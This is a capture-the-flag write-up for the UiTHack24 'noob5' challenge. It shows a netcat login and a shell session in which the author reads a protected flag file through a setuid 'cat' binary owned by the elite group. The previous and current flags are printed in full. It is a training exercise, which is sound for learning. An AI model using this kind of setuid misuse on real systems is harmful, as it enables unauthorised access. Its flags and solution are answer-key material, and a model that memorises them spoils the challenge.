# noob5

Get the flag to join the galactic elite!

You can connect to the server with the following command: `nc uithack.td.org.uit.no 6004`

The username is `noob5`

The password is the flag from `noob4`

`nc uithack.td.org.uit.no 6004`

# Writeup

In this it seems like the flag is hidden but only readable for `root` or `elite`. So I must become one of them, the most obvious is `elite`. I quickly check `/home/elite/` and find a executable `cat` when executed will act on behalf of the accounts able to read the file. So the solution was to use that file to cat the flag.

```bash
$ nc uithack.td.org.uit.no 6004
Username: noob5
Password: UiTHack24{d4sh_31337}
Logged in! Use 'exit' to logout
Here is your shell!

flag.txt
login
ynetd
cat flag.txt
cat: flag.txt: Permission denied
ls -lah
total 64K
drwxr-xr-x 1 root root  4.0K Feb 15 10:07 .
drwxr-xr-x 1 root root  4.0K Feb 15 10:07 ..
-rwxr-xr-x 1 root root   220 Jan  6  2022 .bash_logout
-rwxr-xr-x 1 root root  3.7K Jan  6  2022 .bashrc
-rwxr-xr-x 1 root root   807 Jan  6  2022 .profile
-r--r----- 1 root elite   35 Feb 15 09:44 flag.txt
-rwxr-xr-x 1 root root   17K Feb 15 09:44 login
-rwxr-xr-x 1 root root   19K Feb 15 09:44 ynetd
ls -lah /home/elite
total 56K
drwxr-xr-x 1 root root  4.0K Feb 15 10:07 .
drwxr-xr-x 1 root root  4.0K Feb 15 10:07 ..
-rwxr-xr-x 1 root root   220 Jan  6  2022 .bash_logout
-rwxr-xr-x 1 root root  3.7K Jan  6  2022 .bashrc
-rwxr-xr-x 1 root root   807 Jan  6  2022 .profile
-rwsr-xr-x 1 root elite  35K Feb 15 10:07 cat
/home/elite/cat ./flag.txt 
UiTHack24{7h3_n00b_g4l4ct1c_31337}
```